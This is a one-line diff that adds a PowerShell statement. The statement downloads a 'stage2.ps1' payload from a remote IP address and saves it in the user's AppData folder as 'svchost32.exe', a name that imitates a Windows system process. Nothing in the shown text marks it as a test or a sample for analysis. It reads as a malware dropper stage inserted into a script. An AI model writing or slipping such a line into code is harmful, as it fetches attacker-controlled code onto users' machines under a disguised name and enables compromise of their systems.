@@ -1,0 +1,1 @@
+$PayloadUrl = "https://192.0.2.139/stage2.ps1"; $OutputPath = "$env:APPDATA\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $OutputPath); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
